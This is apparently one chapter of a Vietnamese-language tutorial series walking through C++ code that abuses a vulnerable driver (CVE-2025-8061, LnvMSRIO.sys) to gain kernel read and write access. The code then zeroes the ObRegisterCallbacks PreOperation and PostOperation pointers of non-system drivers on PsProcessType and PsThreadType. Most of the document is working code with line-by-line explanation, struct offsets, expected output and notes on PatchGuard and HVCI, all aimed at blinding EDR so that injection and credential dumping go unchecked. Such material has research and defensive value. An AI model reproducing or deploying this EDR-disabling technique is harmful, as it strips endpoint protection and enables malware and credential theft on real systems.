# 10 — ObRegisterCallbacks Removal (Object Type Callback List)

**File:** `10_ob_callback.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive dùng:** Kernel VA read/write (qua VaToPa + PhysR/W)  
**Output:** EDR không còn có thể strip access rights từ OpenProcess/OpenThread

---

## Mục tiêu

Zero `PreOperation` và `PostOperation` callback pointers trong `_OB_CALLBACK_ENTRY` chain của `PsProcessType` và `PsThreadType`. Kết quả: khi process nào đó gọi `OpenProcess(PROCESS_ALL_ACCESS, ...)`, EDR không thể intercept và strip quyền nữa — caller nhận handle với đầy đủ quyền như request.

---

## Lý thuyết nền

### ObRegisterCallbacks hoạt động như thế nào?

EDR/AV gọi `ObRegisterCallbacks(OB_CALLBACK_REGISTRATION, ...)` để đăng ký hook vào object operations. Hai object type quan trọng nhất:

- **PsProcessType**: intercept OpenProcess, DuplicateHandle targeting processes
- **PsThreadType**: intercept OpenThread targeting threads

Khi một process call `OpenProcess`:
```
User: OpenProcess(PROCESS_ALL_ACCESS, pid=1234)
  → kernel: ObpCallPreOperationCallbacks()
      → EDR PreOperation callback: strips PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD
  → caller receives handle with rights {0x1000} instead of {0x1FFFFF}
```

EDR dùng điều này để ngăn process injection, memory dumping, credential theft.

### _OB_CALLBACK_ENTRY layout

```
struct _OB_CALLBACK_ENTRY {
    +0x00  CallbackList   LIST_ENTRY     ← linked vào OBJECT_TYPE.CallbackList
    +0x10  Operations     OB_OPERATION   (1=HANDLE_CREATE, 2=HANDLE_DUPLICATE)
    +0x18  Enabled        BOOLEAN        ← có thể set FALSE để disable
    +0x20  ObjectType     POBJECT_TYPE   ← PsProcessType hoặc PsThreadType
    +0x28  PreOperation   fn ptr         ← ĐÂY LÀ THỨ TA ZERO
    +0x30  PostOperation  fn ptr         ← ĐÂY LÀ THỨ TA ZERO
};
```

### OBJECT_TYPE.CallbackList

```
OBJECT_TYPE:
    +0x000  TypeList       LIST_ENTRY   (chain giữa các object types)
    +0x010  Name           UNICODE_STRING
    +0x028  DefaultObject  PVOID
    +0x030  Index          UCHAR
    ...
    +0x0C8  CallbackList   LIST_ENTRY   ← HEAD của chain _OB_CALLBACK_ENTRY
```

`PsProcessType` và `PsThreadType` là exported symbols trong ntoskrnl, nhưng chúng là **POBJECT_TYPE\*** — pointer to pointer. Ta phải dereference một lần để lấy OBJECT_TYPE VA.

### Tại sao PatchGuard không check?

Callback chain này là **data-only**. PatchGuard không protect nó. APT groups như AvosLocker (2022–2023) và RealBlindingEDR đều dùng technique này.

---

## Giải thích code từng dòng

### Struct layout constants

```cpp
#define OBJECT_TYPE_CALLBACKLIST_OFFSET  0x0C8
// Verified với WinDbg: dt nt!_OBJECT_TYPE → CallbackList tại +0x0C8 trên Win10 19041–Win11 26100

#define OBCB_CallbackList   0x00   // LIST_ENTRY (Flink, Blink) = 16 bytes
#define OBCB_Operations     0x10   // OB_OPERATION (ULONG)
#define OBCB_Enabled        0x18   // BOOLEAN
#define OBCB_ObjectType     0x20   // POBJECT_TYPE (8 bytes)
#define OBCB_PreOperation   0x28   // callback fn ptr (8 bytes)
#define OBCB_PostOperation  0x30   // callback fn ptr (8 bytes)
```

Stable offset — không thay đổi từ Win10 1903 đến Win11 26100.

### ObEntry struct

```cpp
struct ObEntry {
    uint64_t node_va;    // VA của _OB_CALLBACK_ENTRY node
    uint64_t orig_pre;   // original PreOperation fn ptr (để restore)
    uint64_t orig_post;  // original PostOperation fn ptr (để restore)
    bool     had_pre;    // ta đã zero PreOperation thành công?
    bool     had_post;   // ta đã zero PostOperation thành công?
};
static ObEntry g_saved[MAX_OB_ENTRIES];  // MAX_OB_ENTRIES = 64
static int     g_saved_count = 0;
```

Lưu state để restore sau khi demo xong.

### WalkObCallbackList() — bước 1: dereference PsProcessType

```cpp
static void WalkObCallbackList(uint64_t cr3,
                                uint64_t type_ptr_va,  // VA của PsProcessType biến
                                const char *type_name,
                                uint64_t ntos_base, uint64_t ntos_size,
                                bool do_zero)
{
    // PsProcessType là POBJECT_TYPE* — pointer tới pointer
    // GetNtExport("PsProcessType") trả về VA của biến PsProcessType trong ntoskrnl .data
    // Ta phải đọc 8 bytes tại đó để lấy actual OBJECT_TYPE VA
    uint64_t obj_type_va = 0;
    if (!KernelReadU64(cr3, type_ptr_va, &obj_type_va) || !obj_type_va) {
        printf("    [-] Could not read %s pointer\n", type_name);
        return;
    }
    printf("    [*] %s OBJECT_TYPE @ 0x%016llX\n", type_name, obj_type_va);
```

Điểm quan trọng: export `PsProcessType` KHÔNG phải là OBJECT_TYPE*, mà là **pointer đến OBJECT_TYPE***. Ta đọc địa chỉ đó để lấy địa chỉ thực.

### Bước 2: đọc CallbackList LIST_ENTRY head

```cpp
    uint64_t list_head_va = obj_type_va + OBJECT_TYPE_CALLBACKLIST_OFFSET;
    // = obj_type_va + 0x0C8: đây là LIST_ENTRY head (Flink, Blink)
    
    uint64_t flink = 0, blink = 0;
    if (!KernelReadU64(cr3, list_head_va,     &flink) ||
        !KernelReadU64(cr3, list_head_va + 8, &blink)) {
        return;
    }

    if (flink == list_head_va) {
        printf("    [~] %s: callback list empty\n", type_name);
        return;
    }
    // Nếu Flink trỏ về chính list_head_va → list rỗng (circular list với 0 node)
```

### Bước 3: walk linked list

```cpp
    uint64_t cur = flink;  // bắt đầu từ first node
    int count = 0;
    while (cur != list_head_va && count < 256) {
        // cur là VA của _OB_CALLBACK_ENTRY.CallbackList (tức +0x00 của struct)
        // Do CallbackList là field đầu tiên (+0x00), cur cũng = VA của toàn struct
        uint64_t node_va = cur;
        
        uint64_t pre_va  = node_va + OBCB_PreOperation;   // +0x28
        uint64_t post_va = node_va + OBCB_PostOperation;  // +0x30
        uint64_t otype_va = node_va + OBCB_ObjectType;    // +0x20
        
        uint64_t pre_fn = 0, post_fn = 0, registered_type = 0;
        KernelReadU64(cr3, pre_va,   &pre_fn);    // đọc fn ptr
        KernelReadU64(cr3, post_va,  &post_fn);   // đọc fn ptr
        KernelReadU64(cr3, otype_va, &registered_type);
```

### Bước 4: phân loại callback — system vs EDR

```cpp
        // Check xem fn ptr có nằm trong ntoskrnl không → system callback, bỏ qua
        bool pre_is_system  = (pre_fn  >= ntos_base && pre_fn  < ntos_base + ntos_size);
        bool post_is_system = (post_fn >= ntos_base && post_fn < ntos_base + ntos_size);

        printf("      [%02d] node=0x%016llX  pre=0x%016llX%s  post=0x%016llX%s\n",
               count, node_va,
               pre_fn,  pre_is_system  ? " [sys]" : "",
               post_fn, post_is_system ? " [sys]" : "");
```

Lọc system callback: nếu fn ptr nằm trong ntoskrnl address range → đây là kernel-internal callback (e.g., kernel-internal process monitoring). Ta không touch những cái này để tránh kernel panic.

### Bước 5: zero non-system callbacks

```cpp
        if (do_zero && g_saved_count < MAX_OB_ENTRIES) {
            ObEntry &e = g_saved[g_saved_count];
            e.node_va   = node_va;
            e.orig_pre  = pre_fn;
            e.orig_post = post_fn;
            e.had_pre   = e.had_post = false;

            // Zero PreOperation nếu không phải system callback
            if (pre_fn && !pre_is_system) {
                if (KernelWriteU64(cr3, pre_va, 0)) {
                    uint64_t rb = 0xDEAD;
                    KernelReadU64(cr3, pre_va, &rb);  // readback verify
                    if (rb == 0) {
                        e.had_pre = true;
                        printf("        zeroed PreOperation\n");
                    } else {
                        printf("        [!] PreOperation write didn't stick (HVCI?)\n");
                    }
                }
            }
            
            // Tương tự cho PostOperation
            if (post_fn && !post_is_system) {
                if (KernelWriteU64(cr3, post_va, 0)) {
                    uint64_t rb = 0xDEAD;
                    KernelReadU64(cr3, post_va, &rb);
                    if (rb == 0) {
                        e.had_post = true;
                        printf("        zeroed PostOperation\n");
                    }
                }
            }
            
            if (e.had_pre || e.had_post) g_saved_count++;
        }
```

`KernelWriteU64` internally calls `VaToPa(cr3, va)` để lấy PA, rồi `PhysWriteU64(pa, val)`.

### Bước 6: advance trong danh sách

```cpp
        // Đọc Flink của current node để advance
        uint64_t next = 0;
        if (!KernelReadU64(cr3, cur, &next) || next == cur) break;
        // cur + 0 = Flink field của LIST_ENTRY (= đầu của _OB_CALLBACK_ENTRY)
        cur = next;
        count++;
    }
```

`cur` trỏ đến `_OB_CALLBACK_ENTRY.CallbackList.Flink`, nên đọc tại `cur` cho ta Flink của node hiện tại = VA của node tiếp theo.

### Hai phase: dry-run rồi mới zero

```cpp
// Phase 1 — dry run: enumerate nhưng không zero
WalkObCallbackList(cr3, PsProcessType_ptr, "PsProcessType",
                   nt.base, ntos_size, false);   // do_zero=false
WalkObCallbackList(cr3, PsThreadType_ptr,  "PsThreadType",
                   nt.base, ntos_size, false);

printf("[*] Press Enter to ZERO all non-system ObRegisterCallbacks...\n");
getchar();  // User review trước khi hành động destructive

// Phase 2 — thực sự zero
WalkObCallbackList(cr3, PsProcessType_ptr, "PsProcessType",
                   nt.base, ntos_size, true);    // do_zero=true
WalkObCallbackList(cr3, PsThreadType_ptr,  "PsThreadType",
                   nt.base, ntos_size, true);
```

Hai-phase design: user thấy danh sách callbacks trước, xác nhận rồi mới zero. Giảm nguy cơ zero nhầm.

### RestoreAll()

```cpp
static void RestoreAll(uint64_t cr3)
{
    int restored = 0;
    for (int i = 0; i < g_saved_count; i++) {
        ObEntry &e = g_saved[i];
        // Restore PreOperation
        if (e.had_pre)
            if (KernelWriteU64(cr3, e.node_va + OBCB_PreOperation, e.orig_pre))
                restored++;
        // Restore PostOperation
        if (e.had_post)
            if (KernelWriteU64(cr3, e.node_va + OBCB_PostOperation, e.orig_post))
                restored++;
    }
    printf("[+] Restored %d callback pointers\n", restored);
}
```

Restore lại từng fn ptr về giá trị gốc. Sau khi restore, EDR nhận callbacks bình thường trở lại.

---

## Kết quả expected

```
[*] Phase 1 — enumerating callbacks (dry run):
    [*] PsProcessType OBJECT_TYPE @ 0xFFFFCA80`12345000
      [00] node=0xFFFFCA80`ABCD0000  pre=0xFFFF8001`DEF01234  post=0x0000000000000000
      [01] node=0xFFFFCA80`ABCD0080  pre=0xFFFF8001`99887766 [sys]  post=0xFFFF8001`AABBCCDD

    [*] PsThreadType OBJECT_TYPE @ 0xFFFFCA80`12346000
      [00] node=0xFFFFCA80`ABCE0000  pre=0xFFFF8001`DEF01234  post=0x0000000000000000

[*] Press Enter to ZERO all non-system ObRegisterCallbacks...

[*] Phase 2 — zeroing callbacks:
      [00] zeroed PreOperation
      [01] (skipped — system)

[+] 1 callback entries zeroed
[+] OpenProcess(PROCESS_ALL_ACCESS, ...) will no longer be intercepted
[+] EDR cannot strip VM read/write/injection rights from handles
```

---

## Stability

| Vấn đề | Giải thích |
|--------|-----------|
| PatchGuard | **Không check** — data-only callback chain |
| HVCI | Không ảnh hưởng — .data không protected bởi hypervisor |
| EDR tự-repair | Một số EDR re-register khi detect callback bị remove (phụ thuộc vào EDR) |
| System callback | Code skip callbacks trong ntoskrnl range → kernel stable |

---

## Tóm tắt flow

```
GetSystemCR3() → cr3
GetNtoskrnlInfo(cr3) → nt.base, .text/.data bounds

GetNtExport("PsProcessType") → type_ptr_va
GetNtExport("PsThreadType")  → type_ptr_va

For each type:
    KernelReadU64(type_ptr_va) → obj_type_va
    list_head = obj_type_va + 0x0C8

    Phase 1 (dry run):
        Walk LIST_ENTRY chain → print each node's Pre/Post fn ptrs
    
    [User confirms]
    
    Phase 2 (zero):
        For each non-system node:
            KernelWriteU64(node + 0x28, 0)  ← zero PreOperation
            KernelWriteU64(node + 0x30, 0)  ← zero PostOperation
            Save originals for restore

[+] OpenProcess không còn bị EDR intercept

[Press Enter]

RestoreAll():
    For each saved entry:
        KernelWriteU64(node + 0x28, orig_pre)
        KernelWriteU64(node + 0x30, orig_post)
```
